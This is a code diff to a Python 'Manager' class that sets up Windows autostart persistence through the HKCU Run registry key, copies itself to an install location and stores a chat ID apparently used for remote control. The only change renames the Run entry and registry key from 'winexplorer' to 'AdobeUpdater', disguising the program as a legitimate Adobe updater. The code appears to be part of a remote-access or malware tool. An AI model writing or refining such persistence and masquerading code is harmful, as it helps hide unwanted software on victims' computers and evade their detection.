@@ -73,7 +73,7 @@ class Manager:
   
   def checkAutostart (self):
     REG_PATH = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
-    NAME = 'winexplorer'
+    NAME = 'AdobeUpdater'
     # datatype = winreg.REG_SZ
     try:
       registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
@@ -89,7 +89,7 @@ class Manager:
       try: os.chmod(self.finalLocation, 0o777)
       except: pass
     if not self.checkAutostart():
-      subprocesscall('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /f /t REG_SZ /d "' + self.finalLocation + '"', shell=True)
+      subprocesscall('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AdobeUpdater /f /t REG_SZ /d "' + self.finalLocation + '"', shell=True)
       return True
     return False
 
@@ -98,7 +98,7 @@ class Manager:
       try: os.remove(self.finalLocation)
       except Exception as ex:
         print(ex)
-      subprocesscall('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /f', shell=True)
+      subprocesscall('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AdobeUpdater /f', shell=True)
       self.deleteChatId()
       # copyfile(sys.executable, self.finalLocation)
       return True
@@ -106,7 +106,7 @@ class Manager:
   
   def removeAutostart (self):
     REG_PATH = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
-    NAME = 'winexplorer'
+    NAME = 'AdobeUpdater'
     try:
       registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
       winreg.DeleteKey(registry_key, NAME)
@@ -116,7 +116,7 @@ class Manager:
       return None
 
   def saveChatId(self, chatId):
-    REG_PATH = 'WINEXPLORER_CH'
+    REG_PATH = 'AdobeUpdater_ch'
     NAME = 'VERSION'
     try:
       winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
@@ -128,7 +128,7 @@ class Manager:
       return False
 
   def getChatId(self):
-    REG_PATH = 'WINEXPLORER_CH'
+    REG_PATH = 'AdobeUpdater_ch'
     NAME = 'VERSION'
     try:
       registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
@@ -139,7 +139,7 @@ class Manager:
       return None
   
   def deleteChatId(self):
-    REG_PATH = 'WINEXPLORER_CH'
+    REG_PATH = 'AdobeUpdater_ch'
     NAME = 'VERSION'
     try:
       registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
